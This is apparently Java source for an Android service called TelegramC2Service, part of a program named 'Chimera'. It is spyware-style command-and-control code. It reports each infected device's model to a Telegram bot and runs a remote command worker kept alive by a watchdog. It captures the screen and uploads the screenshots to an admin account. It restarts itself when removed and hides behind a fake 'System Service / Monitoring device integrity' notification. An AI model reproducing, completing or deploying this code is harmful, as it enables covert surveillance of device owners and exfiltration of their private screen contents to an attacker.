package com.chimera;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class TelegramC2Service extends Service {

    private Thread workerThread;
    private HandlerThread screenshotThread;
    private Handler screenshotHandler;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private MediaProjection mediaProjection;
    private MediaProjectionManager projectionManager;
    private Handler watchdogHandler = new Handler();

    private static final String CHANNEL_ID = "ChimeraServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            ConfigLoader.load(this);
            projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            createNotificationChannel();
            startForeground(NOTIFICATION_ID, createNotification());
            sendInstallMessage();
            startWorker();
            startWatchdog();
            screenshotThread = new HandlerThread("ScreenshotHandler");
            screenshotThread.start();
            screenshotHandler = new Handler(screenshotThread.getLooper());
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_FATAL_ONCREATE", e);
        }
    }

    private void startWorker() {
        if (workerThread == null || !workerThread.isAlive()) {
            workerThread = new Thread(new TelegramBotWorker(this));
            workerThread.start();
        }
    }

    private void startWatchdog() {
        watchdogHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (workerThread == null || !workerThread.isAlive()) {
                    ErrorLogger.logError(TelegramC2Service.this, "Watchdog", new Exception("Worker thread died. Restarting."));
                    startWorker();
                }
                watchdogHandler.postDelayed(this, 30000); // Check every 30 seconds
            }
        }, 30000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            if ("ACTION_PREPARE_SCREENSHOT".equals(action)) {
                Intent activityIntent = new Intent(this, ScreenshotActivity.class);
                activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(activityIntent);
            } else if ("ACTION_SCREENSHOT_RESULT".equals(action)) {
                int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
                Intent resultData = intent.getParcelableExtra("resultData");
                if (resultCode == Activity.RESULT_OK && resultData != null) {
                    handleScreenshotResult(resultCode, resultData);
                } else {
                    TelegramBotWorker.sendMessage("Screenshot permission was denied.", this);
                }
            }
        }
        return START_STICKY;
    }

    private void handleScreenshotResult(int resultCode, Intent data) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            }
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection != null) {
                mediaProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        super.onStop();
                        stopScreenshot();
                    }
                }, screenshotHandler);
                captureScreenshot();
            } else {
                TelegramBotWorker.sendMessage("MediaProjection is null. Cannot capture screen.", this);
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "HandleScreenshotResult", e);
            TelegramBotWorker.sendMessage("Failed to start screenshot projection: " + e.getMessage(), this);
        }
    }

    private void captureScreenshot() {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, screenshotHandler);
            screenshotHandler.postDelayed(() -> {
                Image image = null;
                try {
                    image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * width;
                        Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);
                        Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                        bitmap.recycle();
                        File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
                        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                        }
                        croppedBitmap.recycle();
                        TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
                    }
                } catch (Exception e) {
                    ErrorLogger.logError(this, "ScreenshotCapture", e);
                } finally {
                    if (image != null) image.close();
                    stopScreenshot();
                }
            }, 300);
        } catch (Exception e) {
             ErrorLogger.logError(this, "captureScreenshotSetup", e);
             stopScreenshot();
        }
    }

    private void stopScreenshot() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }

    private void sendInstallMessage() {
        String installMessage = "Chimera online: " + Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
        TelegramBotWorker.sendMessage(installMessage, this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        watchdogHandler.removeCallbacksAndMessages(null);
        if (workerThread != null) workerThread.interrupt();
        if (screenshotThread != null) screenshotThread.quitSafely();
        stopScreenshot();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Intent restartIntent = new Intent(getApplicationContext(), this.getClass());
        restartIntent.setPackage(getPackageName());
        PendingIntent pi = PendingIntent.getService(getApplicationContext(), 1, restartIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, pi);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Monitoring device integrity.")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build();
    }
}